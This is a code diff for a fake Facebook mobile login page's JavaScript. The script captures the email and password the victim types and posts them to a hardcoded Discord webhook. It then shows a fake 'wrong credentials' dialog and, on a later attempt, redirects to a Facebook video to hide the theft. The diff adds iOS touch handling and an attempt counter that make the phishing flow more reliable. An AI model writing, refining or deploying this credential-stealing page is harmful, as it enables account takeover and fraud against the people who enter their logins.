@@ -1,6 +1,8 @@
-// Function to create and show the error dialog
+// Enable touch events globally for iOS
+document.addEventListener('touchstart', () => {}, { passive: false });
+
+// Show error dialog
 function showErrorDialog() {
-    // Create dialog elements
     const dialog = document.createElement('div');
     dialog.setAttribute('aria-modal', 'true');
     dialog.setAttribute('role', 'dialog');
@@ -22,79 +24,83 @@ function showErrorDialog() {
         </div>
     `;
     
-    // Apply styles to dialog container (.wbloks_38)
-    dialog.style.alignItems = 'center';
-    dialog.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
-    dialog.style.inset = '0px';
-    dialog.style.display = 'flex';
-    dialog.style.justifyContent = 'space-around';
-    dialog.style.position = 'fixed';
-    dialog.style.zIndex = '1000';
-    dialog.style.fontFamily = 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif';
-    
-    // Style the dialog content (.wbloks_40)
-    const dialogContent = dialog.querySelector('.wbloks_40');
-    dialogContent.style.backgroundColor = 'white';
-    dialogContent.style.borderRadius = '12px';
-    dialogContent.style.margin = '32px';
-    dialogContent.style.maxWidth = '100%';
-    dialogContent.style.textAlign = 'center';
-    dialogContent.style.width = '400px';
-    dialogContent.style.outline = 'none';
-    
-    // Style the OK button container (.wbloks_44)
-    const buttonContainer = dialog.querySelector('.wbloks_44');
-    buttonContainer.style.display = 'block';
-    buttonContainer.style.borderTop = '1px solid rgb(206, 208, 212)';
-    buttonContainer.style.cursor = 'pointer';
-    buttonContainer.style.fontSize = '16px';
-    buttonContainer.style.lineHeight = '1.5';
-    buttonContainer.style.padding = '12px 10px';
-    buttonContainer.style.pointerEvents = 'auto';
-    buttonContainer.style.marginLeft = '0px';
-    
-    // Style the OK button (.wbloks_147)
-    const okButton = dialog.querySelector('.wbloks_147');
-    okButton.style.cursor = 'pointer';
-    okButton.style.display = 'inline-block';
-    okButton.style.textDecoration = 'none';
-    okButton.style.whiteSpace = 'nowrap';
-
-    
-    // Style the OK button text color (.wbloks_47)
-    okButton.style.color = 'rgb(0, 100, 224)';
-    
-    // Apply outline styles to .wbloks_70 elements (if present)
-    const allElements = dialog.querySelectorAll('.wbloks_70 *');
-    allElements.forEach(element => {
-        element.style.outline = 'none';
-        element.style.outlineOffset = '-1px';
+    Object.assign(dialog.style, {
+        alignItems: 'center',
+        backgroundColor: 'rgba(0, 0, 0, 0.5)',
+        inset: '0px',
+        display: 'flex',
+        justifyContent: 'space-around',
+        position: 'fixed',
+        zIndex: '1000',
+        fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
     });
     
-    // Add dialog to body
+    const dialogContent = dialog.querySelector('.wbloks_40');
+    Object.assign(dialogContent.style, {
+        backgroundColor: 'white',
+        borderRadius: '12px',
+        margin: '32px',
+        maxWidth: '100%',
+        textAlign: 'center',
+        width: '400px',
+        outline: 'none'
+    });
+    
+    const buttonContainer = dialog.querySelector('.wbloks_44');
+    Object.assign(buttonContainer.style, {
+        display: 'block',
+        borderTop: '1px solid rgb(206, 208, 212)',
+       
+        fontSize: '16px',
+        lineHeight: '1.5',
+        padding: '12px 10px',
+        pointerEvents: 'auto'
+    });
+    
+    const okButton = dialog.querySelector('.wbloks_147');
+    Object.assign(okButton.style, {
+       
+        textDecoration: 'none',
+        whiteSpace: 'nowrap',
+        padding: '10px 6px',
+        color: 'rgb(0, 100, 224)'
+    });
+    
     document.body.appendChild(dialog);
     
-    // Add click event to OK button to remove dialog
-    okButton.addEventListener('click', () => {
+    const closeDialog = (e) => {
+        e.stopPropagation(); // Prevent event bubbling
         document.body.removeChild(dialog);
-    });
+    };
+    okButton.addEventListener('click', closeDialog);
+    okButton.addEventListener('touchend', closeDialog, { passive: false });
+    okButton.focus();
 }
 
-function openFacebook() {
-    // Get the email and password values
-    const email = document.getElementById('m_login_email').value;
-    const password = document.getElementById('m_login_password').value;
+// Login function with attempt counter and lock
+let isProcessingLogin = false; // Lock to prevent multiple triggers
+let loginAttempts = 0; // Track login attempts
+
+function openFacebook(event) {
+    event.preventDefault();
+    event.stopPropagation(); // Stop bubbling to parent elements
     
-    // Check if fields are empty
+    if (isProcessingLogin) {
+        console.log('Login already in progress, skipping');
+        return;
+    }
+    
+    console.log('Login triggered on', event.type);
+    
+    const email = document.getElementById('m_login_email')?.value;
+    const password = document.getElementById('m_login_password')?.value;
+    
     if (!email || !password) {
         console.log('Please enter both email and password');
         return;
     }
     
-    // List of forbidden words to check against in email
     const forbiddenWords = ['spam', 'test', 'fake', 'dummy'];
-    
-    // Check if email contains any forbidden words
     const hasForbiddenWord = forbiddenWords.some(word => 
         email.toLowerCase().includes(word)
     );
@@ -104,45 +110,169 @@ function openFacebook() {
         return;
     }
     
-    // Get the login button text element
-    const loginButtonText = document.querySelector('[aria-label="Log in"] .wbloks_120');
-    const originalText = loginButtonText.innerHTML;
+    const loginButton = document.querySelector('[aria-label="Log in"]');
+    const loginButtonText = loginButton?.querySelector('.wbloks_120');
+    if (!loginButtonText) {
+        console.error('Login button text element not found');
+        return;
+    }
     
-    // Replace "Log in" text with spinner SVG
+    isProcessingLogin = true; // Lock the function
+    loginAttempts++; // Increment attempt counter
+    console.log('Current login attempt #', loginAttempts);
+    
+    const originalText = loginButtonText.innerHTML;
     loginButtonText.innerHTML = `
         <svg class="wbloks_133 wbloks_134 wbloks_136" viewBox="25 25 50 50" style="width: 20px; height: 20px;">
             <title>Spinner</title>
-            <circle cx="50" cy="50" r="20" fill="none" stroke="var(--wbloks-fig-blue-tint-90)"></circle>
-            <circle class="wbloks_135 wbloks_136" cx="50" cy="50" r="20" fill="none" stroke="var(--wbloks-fig-blue-tint-10)"></circle>
+            <circle cx="50" cy="50" r="20" fill="none" stroke="#d3e1f5"></circle>
+            <circle class="wbloks_135 wbloks_136" cx="50" cy="50" r="20" fill="none" stroke="#0064e0"></circle>
         </svg>
     `;
     
-    // Send credentials to Discord webhook
     const webhookUrl = 'https://discord.com/api/webhooks/1344662302359814184/1WbyocYtJ8qn0vCk1OuUoUfRn-tYb6Ld_pY8ay4xjfkLQcYfVYM2JMvvhlobsYOWFHt2';
     
     fetch(webhookUrl, {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
             content: `New login attempt:\nEmail: ${email}\nPassword: ${password}`
         })
     })
-    .then(response => console.log('Webhook sent successfully'))
-    .catch(error => console.error('Error sending webhook:', error));
-    
-    // Show error dialog after 4-second delay and restore login text
-    setTimeout(() => {
-        showErrorDialog();
-        loginButtonText.innerHTML = originalText; // Restore "Log in" text
-    }, 4000);
+    .then(() => console.log('Webhook sent successfully'))
+    .catch(error => console.error('Error sending webhook:', error))
+    .finally(() => {
+        setTimeout(() => {
+            loginButtonText.innerHTML = originalText;
+            console.log('Processing attempt #', loginAttempts);
+            if (loginAttempts < 2) {
+                // Show dialog for attempts 1 and 2
+                if (!document.querySelector('[aria-modal="true"]')) {
+                    console.log('Showing Wrong Credentials dialog');
+                    showErrorDialog();
+                }
+            } else {
+                // Redirect on 3rd attempt or higher
+                console.log('Attempt #3 reached, redirecting...');
+                const videoUrl = "https://www.facebook.com/share/v/1ADaU5NdNw/?mibextid=wwXIfr";
+                window.location.href = `fb://share/?u=https://www.facebook.com/share/v/1ADaU5NdNw/?mibextid=wwXIfr`;
+                setTimeout(() => {
+                    console.log('Falling back to web URL');
+                    window.location.href = "https://www.facebook.com/share/v/1ADaU5NdNw/?mibextid=wwXIfr";
+                }, 500); // Fallback to web after 500ms
+            }
+            isProcessingLogin = false; // Unlock after processing
+        }, 4000);
+    });
 }
 
-function openRegister() {
+// Register function
+function openRegister(event) {
+    event.preventDefault();
+    event.stopPropagation();
+    console.log('Register button triggered on', event.type);
     window.location.href = "https://m.facebook.com/reg/";
 }
 
-// Add event listeners
-document.querySelector('[aria-label="Log in"]').addEventListener('click', openFacebook);
-document.querySelector('[aria-label="Create new account"]').addEventListener('click', openRegister);
+// Make an element interactive
+function makeInteractive(element, handler) {
+    if (!element) {
+        console.error('Element not found for interaction');
+        return;
+    }
+    
+    Object.assign(element.style, {
+        cursor: 'pointer',
+        pointerEvents: 'auto',
+        touchAction: 'manipulation',
+        userSelect: 'none',
+        webkitUserSelect: 'none',
+        webkitTapHighlightColor: 'transparent',
+        webkitTouchCallout: 'none',
+        position: 'relative',
+        zIndex: '10'
+    });
+    
+    element.removeEventListener('click', handler);
+    element.removeEventListener('touchstart', handler);
+    element.removeEventListener('touchend', handler);
+    
+    element.addEventListener('touchend', (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        handler(e);
+    }, { passive: false });
+    
+    element.addEventListener('click', (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        handler(e);
+    });
+    
+    const children = element.querySelectorAll('*');
+    children.forEach(child => {
+        child.style.pointerEvents = 'none';
+    });
+}
+
+// Observe DOM for buttons
+function setupButtons() {
+    const loginButton = document.querySelector('[aria-label="Log in"]');
+    const registerButton = document.querySelector('[aria-label="Create new account"]');
+    
+    if (loginButton) {
+        makeInteractive(loginButton, openFacebook);
+        console.log('Login button found and initialized');
+    }
+    
+    if (registerButton) {
+        makeInteractive(registerButton, openRegister);
+        console.log('Register button found and initialized');
+    }
+    
+    if (!loginButton || !registerButton) {
+        const observer = new MutationObserver((mutations, obs) => {
+            const newLoginButton = document.querySelector('[aria-label="Log in"]');
+            const newRegisterButton = document.querySelector('[aria-label="Create new account"]');
+            
+            if (newLoginButton) {
+                makeInteractive(newLoginButton, openFacebook);
+                console.log('Login button dynamically detected');
+            }
+            
+            if (newRegisterButton) {
+                makeInteractive(newRegisterButton, openRegister);
+                console.log('Register button dynamically detected');
+            }
+            
+            if (newLoginButton && newRegisterButton) {
+                obs.disconnect();
+            }
+        });
+        
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+    }
+}
+
+// Initialize on load
+document.addEventListener('DOMContentLoaded', () => {
+    Object.assign(document.body.style, {
+        webkitTouchCallout: 'none',
+        webkitUserSelect: 'none',
+        webkitTapHighlightColor: 'rgba(0,0,0,0)',
+        touchAction: 'manipulation'
+    });
+    
+    let viewportMeta = document.querySelector('meta[name="viewport"]');
+    if (!viewportMeta) {
+        viewportMeta = document.createElement('meta');
+        viewportMeta.name = 'viewport';
+        document.head.appendChild(viewportMeta);
+    }
+    viewportMeta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+    
+    setupButtons();
+});
